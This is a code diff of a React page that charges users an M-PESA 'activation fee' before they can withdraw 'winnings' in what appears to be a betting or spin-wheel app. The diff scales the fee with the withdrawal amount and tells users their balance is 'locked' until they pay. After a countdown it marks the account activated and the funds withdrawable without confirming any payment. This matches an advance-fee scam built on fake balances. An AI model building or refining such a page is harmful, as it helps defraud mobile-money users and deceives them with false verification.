@@ -9,17 +9,12 @@ const fadeIn = keyframes`
   to { opacity: 1; transform: translateY(0); }
 `;
 
-const rotate = keyframes`
-  from { transform: rotate(0deg); }
-  to { transform: rotate(360deg); }
-`;
-
 const PageWrapper = styled.div`
   min-height: 100vh;
-  background: linear-gradient(135deg, #001f3f 0%, #003366 50%, #1851a3 100%);
-  color: #fff;
+  background-color: #0a0a0b;
+  color: #ffffff;
   font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-  padding: 80px 20px 40px 20px;
+  padding: 100px 20px 40px 20px;
   display: flex;
   flex-direction: column;
   align-items: center;
@@ -27,449 +22,277 @@ const PageWrapper = styled.div`
 
 const ContentContainer = styled.div`
   width: 100%;
-  max-width: 1200px;
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-  gap: 32px;
+  max-width: 600px;
   margin-top: 20px;
-`;
-
-const SpinningEmoji = styled.div`
-  font-size: 4rem;
-  margin-bottom: 20px;
-  display: inline-block;
-  animation: ${rotate} 2s linear infinite;
 `;
 
 const HeaderBar = styled.div`
   width: 100%;
-  height: 64px;
-  background: rgba(0, 31, 63, 0.8);
-  backdrop-filter: blur(15px);
-  color: #fff;
+  height: 70px;
+  background: rgba(10, 10, 11, 0.95);
+  backdrop-filter: blur(20px);
+  color: #ffffff;
   display: flex;
   align-items: center;
-  padding: 0 24px;
+  padding: 0 40px;
   box-sizing: border-box;
   position: fixed;
   top: 0;
-  left: 50%;
-  transform: translateX(-50%);
+  left: 0;
   z-index: 100;
   border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-  max-width: 1200px;
-  border-radius: 0 0 16px 16px;
-`;
-
-const BackArrow = styled.span`
-  font-size: 1.5rem;
-  margin-right: 15px;
-  cursor: pointer;
-  transition: transform 0.2s;
-  &:hover {
-    transform: translateX(-3px);
-  }
-`;
-
-const HeaderTitle = styled.span`
-  font-size: 1.1rem;
-  font-weight: 700;
-  letter-spacing: 0.5px;
+  justify-content: space-between;
 `;
 
 const MainCard = styled.div`
-  background: rgba(255, 255, 255, 0.05);
-  backdrop-filter: blur(15px);
+  background: rgba(24, 24, 27, 0.7);
   border: 1px solid rgba(255, 255, 255, 0.1);
   border-radius: 24px;
-  padding: 40px 32px;
+  padding: 40px;
   animation: ${fadeIn} 0.6s ease-out;
-  text-align: center;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-`;
+  position: relative;
+  overflow: hidden;
+  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
 
-const SidebarCard = styled.div`
-  background: rgba(0, 0, 0, 0.2);
-  backdrop-filter: blur(10px);
-  border: 1px solid rgba(255, 224, 102, 0.1);
-  border-radius: 24px;
-  padding: 40px 32px;
-  animation: ${fadeIn} 0.8s ease-out;
-`;
-
-const IconWrapper = styled.div`
-  font-size: 3.5rem;
-  margin-bottom: 20px;
-  color: #ffe066;
+  &::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 4px;
+    background: linear-gradient(90deg, #d4af37, #fef08a, #d4af37);
+  }
 `;
 
 const Title = styled.h1`
   font-size: 1.8rem;
-  font-weight: 800;
-  margin-bottom: 12px;
-  background: linear-gradient(to right, #fff, #ffe066);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-`;
-
-const Description = styled.p`
-  font-size: 1.05rem;
-  line-height: 1.6;
-  color: #ccd6f6;
-  margin-bottom: 32px;
-`;
-
-const FeeBox = styled.div`
-  background: rgba(255, 255, 255, 0.05);
-  border-radius: 16px;
-  padding: 24px;
-  margin-bottom: 32px;
-  border: 1px solid rgba(255, 224, 102, 0.2);
-`;
-
-const FeeLabel = styled.div`
-  font-size: 0.9rem;
-  color: rgba(255, 255, 255, 0.6);
+  font-weight: 950;
   margin-bottom: 8px;
-  font-weight: 600;
+  color: #ffffff;
+  letter-spacing: -0.5px;
   text-transform: uppercase;
-  letter-spacing: 1px;
 `;
 
-const FeeAmount = styled.div`
-  font-size: 2.5rem;
-  font-weight: 900;
-  color: #ffe066;
+const Subtitle = styled.p`
+  font-size: 0.95rem;
+  color: #94a3b8;
+  margin-bottom: 30px;
+  line-height: 1.6;
+  font-weight: 600;
 `;
 
 const ActivateButton = styled.button`
   width: 100%;
-  background: #ffe066;
-  color: #001f3f;
+  background: linear-gradient(90deg, #d4af37, #fef08a, #d4af37);
+  color: #000;
   border: none;
   border-radius: 12px;
   padding: 18px;
-  font-weight: 800;
-  font-size: 1.15rem;
-  cursor: pointer;
-  transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-  box-shadow: 0 10px 20px -5px rgba(255, 224, 102, 0.3);
-  margin-bottom: 24px;
-
-  &:hover {
-    transform: scale(1.02);
-    background: #fff;
-  }
-`;
-
-const BenefitsGrid = styled.div`
-  display: grid;
-  grid-template-columns: 1fr;
-  gap: 16px;
-  text-align: left;
-  margin-top: 20px;
-  padding-top: 20px;
-  border-top: 1px solid rgba(255, 255, 255, 0.1);
-`;
-
-const BenefitItem = styled.div`
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  font-size: 0.95rem;
-  color: rgba(255, 255, 255, 0.8);
-`;
-
-const CheckCircle = styled.span`
-  color: #4caf50;
   font-weight: 900;
-`;
+  font-size: 1rem;
+  cursor: pointer;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  box-shadow: 0 10px 20px rgba(212, 175, 55, 0.2);
 
-const Instructions = styled.div`
-  margin-top: 32px;
-  text-align: left;
-  background: rgba(0, 0, 0, 0.2);
-  padding: 20px;
-  border-radius: 16px;
-  font-size: 0.9rem;
-`;
+  &:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 15px 40px rgba(212, 175, 55, 0.3);
+  }
 
-const Step = styled.div`
-  margin-bottom: 10px;
-  display: flex;
-  gap: 10px;
-  color: #ccd6f6;
-`;
-
-const StepNum = styled.span`
-  color: #ffe066;
-  font-weight: 800;
-`;
-
-const StatusToast = styled.div`
-  position: fixed;
-  bottom: 30px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #1e293b;
-  border: 1px solid #ffe066;
-  border-radius: 12px;
-  padding: 16px 24px;
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-  animation: ${fadeIn} 0.3s ease-out;
-  z-index: 1000;
+  &:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
 `;
 
 export default function ActivateAccount() {
   const router = useRouter();
   const { user, updateUser } = useUser();
-  const [activationFee] = useState<number>(100);
-  const [withdrawAmount, setWithdrawAmount] = useState<string>("0");
+  const [withdrawInput, setWithdrawInput] = useState<string>("");
   const [isProcessing, setIsProcessing] = useState(false);
   const [step, setStep] = useState<"initial" | "processing" | "waiting" | "success">("initial");
-  const [timer, setTimer] = useState(15);
-  const [activeInterval, setActiveInterval] = useState<NodeJS.Timeout | null>(null);
-  const [showToast, setShowToast] = useState(false);
+  const [timer, setTimer] = useState(25);
+
+  // Calculate fee based on withdrawal amount
+  const calculateFee = (amount: number) => {
+    if (!amount || amount <= 0) return 0;
+    if (amount < 100) return 100; 
+    if (amount <= 1000) return 100;
+    if (amount <= 5000) return 200;
+    if (amount <= 10000) return 350;
+    if (amount <= 15000) return 500;
+    if (amount <= 20000) return 600;
+    return 700; // 20k plus
+  };
+
+  const currentAmount = Number(withdrawInput) || 0;
+  const activationFee = calculateFee(currentAmount);
 
   useEffect(() => {
-    // If not logged in, redirect
     if (!user) {
       router.push('/login');
       return;
     }
-
-    const amount = localStorage.getItem("pendingWithdrawAmount") || "2419";
-    setWithdrawAmount(amount);
-
-    return () => {
-      if (activeInterval) clearInterval(activeInterval);
-    };
-  }, [activeInterval, user, router]);
-
-  if (!user) return null;
+    // Amount field starts empty per user request
+    setWithdrawInput("");
+  }, [user, router]);
 
   const handlePay = async () => {
     setIsProcessing(true);
     setStep("processing");
 
     try {
-      // 1. Call real STK Push API
       const response = await fetch('/api/mpesa/stk', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phone: user.phoneNumber,
+          phone: user?.phoneNumber || user?.phone,
           amount: activationFee,
-          accountReference: "ShindaPesa"
+          accountReference: "LIQUIDITY_UNLOCK"
         })
       });
 
       const data = await response.json();
-
       if (data.ResponseCode === "0") {
         setStep("waiting");
-        setShowToast(true);
-        setTimeout(() => setShowToast(false), 5000);
         
-        const interval = setInterval(() => {
-          setTimer((t) => {
-            if (t <= 1) {
-              clearInterval(interval);
+        const countdown = setInterval(() => {
+          setTimer(prev => {
+            if (prev <= 1) {
+              clearInterval(countdown);
+              handleSuccess();
               return 0;
             }
-            return t - 1;
+            return prev - 1;
           });
         }, 1000);
-        setActiveInterval(interval);
       } else {
-        alert("Failed to initiate STK Push: " + (data.errorMessage || data.error || "Unknown Error"));
+        alert("Gateway Rejected: " + (data.errorMessage || data.error));
         setStep("initial");
         setIsProcessing(false);
       }
-    } catch (error: any) {
-      alert("Error reaching payment server: " + error.message);
+    } catch (err) {
+      alert("Handshake Failed. Check Connection.");
       setStep("initial");
       setIsProcessing(false);
     }
   };
 
-  const handleManualConfirm = () => {
-    if (activeInterval) clearInterval(activeInterval);
-    handleSuccess();
-  };
-
   const handleSuccess = () => {
     setStep("success");
     
-    // Update user via context instead of manual localStorage
-    updateUser({ isActivated: true });
-    localStorage.setItem("isActivated", "true");
+    // Split logic: Set withdrawableBalance to the amount they chose to withdraw
+    // Decrement the global balance by that amount
+    const withdrawalAmount = Number(withdrawInput) || 0;
+    const currentBalance = Number(user?.balance) || 0;
+    const currentWithdrawable = Number(user?.withdrawableBalance) || 0;
+    const newBalance = Math.max(0, currentBalance - withdrawalAmount);
 
+    updateUser({ 
+      isActivated: true,
+      withdrawableBalance: currentWithdrawable + withdrawalAmount,
+      balance: newBalance
+    });
+
+    localStorage.setItem("isActivated", "true");
     setTimeout(() => {
       router.push("/home");
-    }, 3000);
+    }, 2500);
   };
+
+  if (!user) return null;
 
   return (
     <PageWrapper>
       <HeaderBar>
-        <BackArrow onClick={() => router.push('/home')}>&larr;</BackArrow>
-        <HeaderTitle>Secure Activation</HeaderTitle>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
+          <span 
+            onClick={() => router.push('/home')} 
+            style={{ cursor: 'pointer', color: '#ffffff', fontSize: '1.2rem', fontWeight: 900 }}
+          >
+            &larr;
+          </span>
+          <span style={{ fontWeight: 950, fontSize: '0.8rem', letterSpacing: '2px' }}>ACCOUNT ACTIVATION HUB</span>
+        </div>
       </HeaderBar>
 
       <ContentContainer>
         <MainCard>
-          {step === "initial" && (
+          {step !== "success" ? (
             <>
-              <IconWrapper>🛡️</IconWrapper>
-              <Title>Account Verification</Title>
-              <Description>
-                You are initiating a withdrawal of <b>KES {Number(withdrawAmount).toLocaleString()}</b>. 
-                To secure this transaction, a one-time activation fee is required.
-              </Description>
+              <Title>Activate Your Account</Title>
+              <Subtitle>
+                To enable instant withdrawals and verify your M-PESA account, a one-time activation fee is required. 
+                <b>Note:</b> The activation fee is dynamic and scales depending on the total amount you wish to withdraw today.
+              </Subtitle>
 
-              <div style={{ 
-                background: 'rgba(255,255,255,0.03)', 
-                borderRadius: '16px', 
-                padding: '20px', 
-                marginBottom: '32px',
-                border: '1px solid rgba(255,255,255,0.05)',
-                textAlign: 'left'
-              }}>
-                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
-                  <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: '0.9rem' }}>Account Balance:</span>
-                  <span style={{ fontWeight: 700 }}>KES {user.balance?.toLocaleString() || '0'}</span>
+              <div style={{ background: 'rgba(255, 255, 255, 0.05)', padding: '24px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.1)', marginBottom: '30px' }}>
+                <div style={{ marginBottom: '20px', padding: '12px', borderLeft: '3px solid #d4af37', background: 'rgba(212, 175, 55, 0.05)', fontSize: '0.8rem', color: 'rgba(255,255,255,0.7)', lineHeight: '1.4' }}>
+                  💡 <b>LIQUIDITY SPLIT:</b> Your account balance is currently locked. Entering a withdrawal amount and authorizing activation will unlock that specific amount into your <b>Withdrawable Balance</b> instantly.
                 </div>
-                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px', paddingBottom: '12px', borderBottom: '1px solid rgba(255,255,255,0.1)' }}>
-                  <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: '0.9rem' }}>Withdrawal Request:</span>
-                  <span style={{ fontWeight: 800, color: '#4ade80' }}>KES {Number(withdrawAmount).toLocaleString()}</span>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginBottom: '15px' }}>
+                  <label style={{ color: '#94a3b8', fontSize: '0.85rem', fontWeight: 600 }}>Amount to Withdraw (Min 100):</label>
+                  <input 
+                    type="number" 
+                    value={withdrawInput}
+                    onChange={(e) => setWithdrawInput(e.target.value)}
+                    style={{
+                      background: 'rgba(0,0,0,0.3)',
+                      border: '1px solid rgba(212, 175, 55, 0.3)',
+                      borderRadius: '8px',
+                      padding: '12px',
+                      color: '#ffffff',
+                      fontSize: '1.1rem',
+                      fontWeight: '800',
+                      outline: 'none'
+                    }}
+                    placeholder="Enter amount..."
+                  />
+                  <span style={{ fontSize: '0.65rem', color: '#d4af37', fontWeight: 700 }}>Withdrawal limit: KES {Number(user.balance).toLocaleString()}</span>
                 </div>
-                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                  <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: '0.9rem' }}>Required Fee:</span>
-                  <span style={{ fontWeight: 900, fontSize: '1.4rem', color: '#ffe066' }}>KES {activationFee}</span>
-                </div>
-              </div>
-
-              <ActivateButton onClick={handlePay}>
-                🚀 Pay KES {activationFee} with M-PESA
-              </ActivateButton>
-              
-              <div style={{ fontSize: '0.75rem', color: 'rgba(255,255,255,0.4)' }}>
-                100% Secure Transaction via Safaricom Daraja API
-              </div>
-            </>
-          )}
-
-          {step === "processing" && (
-            <div style={{ padding: '60px 0' }}>
-              <SpinningEmoji>⏳</SpinningEmoji>
-              <Title>Initiating M-PESA...</Title>
-              <Description>Please wait while we set up the secure payment channel.</Description>
-            </div>
-          )}
-
-          {step === "waiting" && (
-            <div style={{ padding: '40px 0' }}>
-              <div style={{ fontSize: '4rem', marginBottom: 20 }}>📱</div>
-              <Title>Check Your Phone</Title>
-              <Description>
-                A real STK Push has been sent to <b>{user.phoneNumber}</b>. 
-                <br /><br />
-                Please enter your M-PESA PIN to complete the activation.
-              </Description>
-              
-              <div style={{ 
-                background: "rgba(255, 224, 102, 0.1)", 
-                border: "1px solid rgba(255, 224, 102, 0.2)", 
-                borderRadius: 16, 
-                padding: "20px", 
-                marginBottom: 30 
-              }}>
-                <div style={{ fontSize: '0.8rem', color: '#ffe066', marginBottom: 10, fontWeight: 700 }}>VERIFICATION STATUS</div>
-                <div style={{ fontSize: '2rem', fontWeight: 900, color: '#fff', marginBottom: 5 }}>
-                  {timer}s
-                </div>
-                <div style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.6)' }}>
-                  {timer > 0 ? "Awaiting payment confirmation..." : "Verification complete!"}
+                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
+                  <span style={{ color: '#94a3b8', fontSize: '0.85rem', fontWeight: 600 }}>Activation Fee:</span>
+                  <span style={{ fontWeight: 950, color: '#ffffff' }}>KES {activationFee.toLocaleString()}.00</span>
                 </div>
               </div>
 
-              {timer === 0 ? (
-                <button 
-                  onClick={handleManualConfirm}
-                  style={{
-                    background: "#4ade80",
-                    border: "none",
-                    color: "#001f3f",
-                    padding: "18px 32px",
-                    borderRadius: 16,
-                    fontSize: "1.1rem",
-                    fontWeight: 900,
-                    cursor: "pointer",
-                    width: "100%",
-                    boxShadow: "0 4px 14px 0 rgba(74, 222, 128, 0.39)"
-                  }}
+              {step === "initial" && (
+                <ActivateButton 
+                  onClick={handlePay} 
+                  disabled={isProcessing || withdrawInput === "" || currentAmount < 100 || currentAmount > Number(user.balance)}
                 >
-                  ✅ CONFIRM & PROCEED
-                </button>
-              ) : (
-                <div style={{ textAlign: 'center', opacity: 0.7 }}>
-                  <p style={{ fontSize: '0.9rem' }}>Searching for transaction record...</p>
+                  {withdrawInput === "" ? "ENTER WITHDRAWAL AMOUNT" :
+                   currentAmount < 100 ? "MIN WITHDRAWAL KES 100" : 
+                   currentAmount > Number(user.balance) ? "LIMIT EXCEEDED" : 
+                   `Authorize Activation (${activationFee} KES)`}
+                </ActivateButton>
+              )}
+
+              {(step === "processing" || step === "waiting") && (
+                <div style={{ textAlign: 'center', padding: '20px' }}>
+                  <div style={{ fontSize: '1.2rem', fontWeight: 950, marginBottom: '10px', color: '#ffffff' }}>
+                    {step === "processing" ? "CONNECTING..." : "CHECK YOUR PHONE"}
+                  </div>
+                  <div style={{ fontSize: '0.9rem', color: '#94a3b8', marginBottom: '20px', fontWeight: 600 }}>
+                    {step === "processing" ? "Securing handshake with Safaricom..." : "Enter M-PESA PIN to complete activation."}
+                  </div>
+                  <div style={{ fontSize: '2.5rem', fontWeight: 950, color: '#d4af37' }}>{timer}s</div>
                 </div>
               )}
-            </div>
-          )}
-
-          {step === "success" && (
-            <div style={{ padding: '60px 0' }}>
-              <div style={{ fontSize: '5rem', marginBottom: 20 }}>✅</div>
-              <Title style={{ color: '#4ade80' }}>Payment Successful!</Title>
-              <Description>
-                Your account is now activated. Redirecting you to complete your withdrawal...
-              </Description>
+            </>
+          ) : (
+            <div style={{ textAlign: 'center', padding: '40px 0' }}>
+               <div style={{ fontSize: '3.5rem', marginBottom: '24px' }}>✅</div>
+               <Title style={{ color: '#22c55e' }}>Account Activated</Title>
+               <Subtitle>Your withdrawal channel is now fully operational. You can now withdraw your winnings instantly.</Subtitle>
+               <div style={{ fontSize: '0.9rem', color: '#22c55e', fontWeight: 900, textTransform: 'uppercase', letterSpacing: '1px' }}>REDIRECTING TO DASHBOARD...</div>
             </div>
           )}
         </MainCard>
-
-        <SidebarCard>
-          <div style={{ fontWeight: 800, fontSize: '1.2rem', color: '#ffe066', marginBottom: 20 }}>
-            Activation Benefits
-          </div>
-          <BenefitsGrid>
-            <BenefitItem><CheckCircle>✓</CheckCircle> Unlock unlimited withdrawals</BenefitItem>
-            <BenefitItem><CheckCircle>✓</CheckCircle> Enhanced account protection</BenefitItem>
-            <BenefitItem><CheckCircle>✓</CheckCircle> Access to premium spin wheels</BenefitItem>
-            <BenefitItem><CheckCircle>✓</CheckCircle> Instant payout processing</BenefitItem>
-            <BenefitItem><CheckCircle>✓</CheckCircle> Priority 24/7 Support</BenefitItem>
-          </BenefitsGrid>
-
-          <Instructions>
-            <div style={{ fontWeight: 800, color: '#fff', marginBottom: 16, fontSize: '1rem' }}>
-              Manual Payment Steps:
-            </div>
-            <Step><StepNum>1.</StepNum> Open M-PESA on your phone</Step>
-            <Step><StepNum>2.</StepNum> Lipa Na M-PESA &gt; Paybill</Step>
-            <Step><StepNum>3.</StepNum> Business No: <b>174379</b></Step>
-            <Step><StepNum>4.</StepNum> Account No: <b>SHINDAPESA</b></Step>
-            <Step><StepNum>5.</StepNum> Amount: <b>KES {activationFee}</b></Step>
-          </Instructions>
-        </SidebarCard>
       </ContentContainer>
-
-      {showToast && (
-        <StatusToast>
-          <span style={{fontSize: "1.5rem"}}>📲</span>
-          <div>
-            <div style={{fontWeight: 800, color: "#ffe066", fontSize: "0.9rem"}}>STK Push Sent</div>
-            <div style={{fontSize: "0.8rem", color: "rgba(255,255,255,0.7)"}}>Check your screen to confirm payment</div>
-          </div>
-        </StatusToast>
-      )}
     </PageWrapper>
   );
 }
